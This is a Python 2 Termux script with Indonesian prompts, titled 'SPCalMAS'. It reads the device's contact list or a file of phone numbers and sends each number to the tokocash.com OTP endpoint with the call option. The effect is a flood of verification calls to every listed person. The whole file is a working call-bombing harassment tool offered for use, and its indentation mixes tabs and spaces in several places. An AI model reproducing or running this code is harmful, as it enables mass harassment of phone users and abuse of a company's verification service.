# coding:utf8

import requests,sys,os,json
import subprocess as sp

ijo="\033[1;92m"
xxx="\033[1;97m"
red="\033[1;91m"

if os.path.exists("~/../usr/bin/termux-contact-list")==False:
	sp.call(["pkg install termux-api"],shell=True,stderr=sp.STDOUT,stdout=sp.PIPE)


def kontak():
	if os.path.exists("~/../usr/bin/termux-contact-list")==False:
		sp.call(["pkg install termux-api"],shell=True,stderr=sp.STDOUT,stdout=sp.PIPE)
	print(" %s[%s•%s] %splease wait.."%(ijo,red,ijo,xxx))
	daftar=sp.check_output("termux-contact-list")
	print " "+ijo+30*"-"
	for i in json.loads(daftar):
	    
		nomor=i["number"].replace("-","")
		nomor=nomor.replace(" ","")
		nomor=nomor.replace("@","")
		nomor=nomor.replace(",","")
		nomor=nomor.replace("!","")
                nomor=nomor.replace("+","")
		nomor=nomor.replace("$","")
                nomor=nomor.replace("#","")
                nomor=nomor.replace("=","")
		if len(nomor)>15:
			pass
		else:
		    try:
			url=requests.post("https://www.tokocash.com/oauth/otp",data={"msisdn":nomor,"accept":"call"}).status_code
			print ("%s [%s@%s]%s name: %s"%(ijo,red,ijo,xxx,i["name"]))
			if url==200:
				print (" %s[%s@%s]%s nomor: %s%s SUKSES"%(ijo,red,ijo,xxx,nomor,ijo))
			else:
				print (" %s[%s@%s]%s nomor: %s%s GAGAL"%(ijo,red,ijo,xxx,nomor,red))
			print(ijo+" "+30*"-")
		    except requests.exceptions.ConnectionError:
			quit(" [!] koneksi buruk gan")


def txt():
	file=raw_input(" %s[%s?%s]%s file: "%(ijo,red,ijo,xxx))
        if file=="":
                        txt()
	if os.path.exists(file):
		o=open(file,"r").read().split()
		for i in o:
			nomor=i.replace(" ","")
        	        nomor=nomor.replace("@","")
	                nomor=nomor.replace(",","")
	                nomor=nomor.replace("!","")
	                nomor=nomor.replace("+","")
	                nomor=nomor.replace("$","")
	                nomor=nomor.replace("#","")
	                nomor=nomor.replace("=","")
			try:
			    url=requests.post("https://www.tokocash.com/oauth/otp",data={"msisdn":nomor,"accept":"call"}).status_code
		     	    if url==200:
                                print (" %s[%s@%s]%s nomor: %s%s SUKSES"%(ijo,red,ijo,xxx,nomor,ijo))
                            else:
                                print (" %s[%s@%s]%s nomor: %s%s GAGAL"%(ijo,red,ijo,xxx,nomor,red))
                            print(ijo+" "+30*"-")
                        except requests.exceptions.ConnectionError:
                                 quit(" [!] koneksi buruk gan")
	else:
		quit(" [!] file tidak di temukan..")




if __name__=="__main__":
	os.system("clear")
	print("""
%s [ %sSPCalMAS By Maoundis %s],%s

 {%s01%s} Daftar kontak
 {%s02%s} Dari file
 {%s00%s} keluar
"""%(ijo,xxx,ijo,xxx,ijo,xxx,ijo,xxx,red,xxx))
	try:
		pi=raw_input(" %s[%s>%s]%s pilih: "%(ijo,red,ijo,xxx))
	except:
		quit(" [!] interrupt")
	if   pi in ["01","1"]:
		kontak()
	elif pi in ["02","2"]:
		txt()
	else:
		quit(xxx+" [!] keluar")
